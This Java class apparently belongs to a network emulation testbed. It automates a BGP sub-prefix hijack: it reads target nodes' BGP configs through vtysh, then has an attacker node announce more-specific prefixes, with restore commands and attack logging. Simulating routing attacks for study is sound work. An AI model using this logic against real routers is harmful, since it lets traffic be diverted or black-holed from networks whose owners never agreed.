package com.routebox.manager.attack.bgp;

import com.routebox.entity.index.AttackLog;
import com.routebox.manager.InteractionManager;
import com.routebox.util.IpBgpUtil;
import com.routebox.util.TimeUtil;

import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * @Description Sub-Prefix Hijack Attack Handler
 * @Date 2025/3/29
**/
public class SubPrefixHijackingAttackHandler extends BgpAttackHandler {

    public SubPrefixHijackingAttackHandler(Integer sourceNodeId, List<Integer> targetNodeIds) {
        super(sourceNodeId, targetNodeIds, "Sub-prefix Hijack");
    }

    @Override
    public boolean attack() {
        List<Integer> targetNodeIds = getTargetIds();

        InteractionManager.clearWsResponse();
        InteractionManager.sendCmd(targetNodeIds, "vtysh -c 'show running-config'");
        ConcurrentHashMap<Integer, List<String>> wsResponseMap = InteractionManager.getWsResponse();

        for (Integer nodeId : targetNodeIds) {
            List<String> networkPrefixes = IpBgpUtil.parseNetworkIps(wsResponseMap.get(nodeId));
            if (!networkPrefixes.isEmpty()) {
                focusedIdIpMap.put(nodeId, IpBgpUtil.extendIpPrefix(networkPrefixes.get(random.nextInt(networkPrefixes.size()))));
            }
        }

        if (focusedIdIpMap.isEmpty()) return false;

        StringBuilder apBuilder = new StringBuilder();
        apBuilder.append("Node [")
                .append(getAttackerId())
                .append("] launched ")
                .append(ATTACK_TYPE)
                .append(" attack at ")
                .append(TimeUtil.getNowTimeStr())
                .append(", the following announced IP sub-prefixes are:\n");

        InteractionManager.clearWsResponse();
        StringBuilder baseCmd = new StringBuilder("vtysh -c 'configure' -c 'router bgp'");

        // Construct Attack Command
        focusedIdIpMap.forEach((nodeId, ip) -> {
            baseCmd.append(" -c ").append("'network ").append(ip).append("'");
            apBuilder.append("Node [").append(nodeId).append("]").append(" with it's IP sub-prefixes: ").append(ip).append("\n");
        });
        String cmd = baseCmd.toString();
        restoreCmdList.add(cmd.replace("network", "no network"));
        InteractionManager.sendCmd(getAttackerId(), cmd);

        postAttack(getAttackLog(apBuilder.toString()));

        return true;
    }

    private AttackLog getAttackLog(String attackProcess) {
        AttackLog attackLog = new AttackLog();
        attackLog.setAttackers(List.of(getAttackerId()));
        attackLog.setVictims(getTargetIds());
        attackLog.setAttackProcess(attackProcess);

        return attackLog;
    }
}